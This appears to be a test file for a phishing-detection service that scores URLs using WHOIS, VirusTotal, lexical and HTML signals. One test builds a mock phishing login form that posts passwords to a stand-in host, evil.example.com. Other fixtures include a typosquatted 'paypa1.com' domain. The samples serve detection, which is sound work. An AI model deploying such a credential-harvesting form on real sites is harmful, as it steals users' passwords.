import test from 'node:test';
import assert from 'node:assert/strict';

import { computeRisk } from '../src/services/risk.service.js';
import { extractFeatures, buildFeatureVector } from '../src/services/features/featureExtractor.service.js';
import { analyzeHtmlContent } from '../src/services/htmlAnalyzer.service.js';

const CLEAN_FINDINGS = {
  dns: {},
  whois: { daysSinceRegistration: 1000, registerName: 'Stable Registrar' },
  html: { success: true, threatFound: false, riskScore: 0, findings: [], signals: [] },
  virustotal: { success: true, positives: 0, totalScanners: 90 },
  lexical: { fullFindings: [], observations: [], urlMetadata: { registeredDomain: 'example.com' } },
};

test('HTML signals now contribute to the risk score (gap closed)', () => {
  const withoutHtml = computeRisk(CLEAN_FINDINGS, [], 'https://example.com');

  const withHtml = computeRisk(
    {
      ...CLEAN_FINDINGS,
      html: {
        success: true,
        threatFound: false,
        riskScore: 25,
        findings: ['Credential Harvest Signal: Target form contains active password fields.'],
        signals: [{ id: 'HTML_PASSWORD_FIELD', severity: 'high', weight: 25, message: 'password field' }],
      },
    },
    [],
    'https://example.com'
  );

  assert.equal(withoutHtml.score, 0, 'clean baseline should be SAFE/0');
  assert.equal(withHtml.score, 25, 'HTML password-field signal should add its 25 points');

  const htmlFeatures = withHtml.features.filter((f) => f.source === 'html');
  assert.equal(htmlFeatures.length, 1);
  assert.equal(htmlFeatures[0].id, 'HTML_PASSWORD_FIELD');
});

test('extractFeatures unifies every intelligence source into one list', () => {
  const findings = {
    whois: { daysSinceRegistration: 5 },
    html: {
      success: true,
      riskScore: 40,
      findings: [],
      signals: [{ id: 'HTML_EXTERNAL_FORM', severity: 'high', weight: 40, message: 'external form' }],
    },
    virustotal: { success: true, positives: 3, totalScanners: 90 },
    lexical: {
      fullFindings: [
        { observationId: 'BRAND_TYPOSQUAT', title: 'Typo', suggestedSeverity: 'critical', confidence: 0.9, suppressed: false },
      ],
      observations: [],
      urlMetadata: { registeredDomain: 'paypa1.com' },
    },
  };
  const correlations = [{ id: 'CORR_BRAND_IMPERSONATION', title: 'Brand', severity: 'CRITICAL', confidence: 'HIGH', evidence: [] }];

  const { features } = extractFeatures(findings, correlations);
  const sources = new Set(features.map((f) => f.source));

  for (const expected of ['correlation', 'whois', 'virustotal', 'lexical', 'html']) {
    assert.ok(sources.has(expected), `expected a feature from source "${expected}"`);
  }
});

test('buildFeatureVector produces a fixed, numeric schema', () => {
  const findings = {
    whois: { daysSinceRegistration: 5 },
    html: {
      success: true,
      riskScore: 65,
      findings: [],
      signals: [
        { id: 'HTML_PASSWORD_FIELD', severity: 'high', weight: 25, message: 'pw' },
        { id: 'HTML_EXTERNAL_FORM', severity: 'high', weight: 40, message: 'ext' },
      ],
    },
    virustotal: { success: true, positives: 3, totalScanners: 90 },
    lexical: {
      fullFindings: [
        { observationId: 'BRAND_TYPOSQUAT', title: 'Typo', suggestedSeverity: 'critical', confidence: 0.9, suppressed: false },
      ],
      urlMetadata: { registeredDomain: 'paypa1.com', urlLength: 42 },
    },
  };

  const vector = buildFeatureVector(findings, []);

  assert.equal(vector.domain_age_days, 5);
  assert.equal(vector.vt_positive_ratio, 0.0333);
  assert.equal(vector.has_typosquat, 1);
  assert.equal(vector.html_has_password_field, 1);
  assert.equal(vector.html_signal_count, 2);
  assert.equal(vector.url_length, 42);

  // Every value must be JSON-serialisable (no undefined / functions).
  assert.doesNotThrow(() => JSON.stringify(vector));
});

test('HTML analyzer emits structured signals whose weights sum to riskScore', () => {
  const html = `<!doctype html><html><head><title>Secure Login</title></head>
    <body><form action="https://evil.example.com/collect">
      <input type="password" name="pw" />
    </form></body></html>`;

  const result = analyzeHtmlContent(html, 'https://phish.example.com/login');

  assert.equal(result.success, true);
  assert.ok(Array.isArray(result.signals) && result.signals.length > 0);

  const ids = new Set(result.signals.map((s) => s.id));
  assert.ok(ids.has('HTML_PASSWORD_FIELD'), 'expected a password-field signal');
  assert.ok(ids.has('HTML_EXTERNAL_FORM'), 'expected an external-form signal');

  const weightSum = result.signals.reduce((sum, s) => sum + s.weight, 0);
  assert.equal(result.riskScore, weightSum, 'riskScore must equal the sum of signal weights');

  // And those HTML signals must move the global score.
  const scored = computeRisk(
    { ...CLEAN_FINDINGS, html: result },
    [],
    'https://phish.example.com/login'
  );
  assert.ok(scored.score >= result.riskScore, 'global score should include the HTML contribution');
});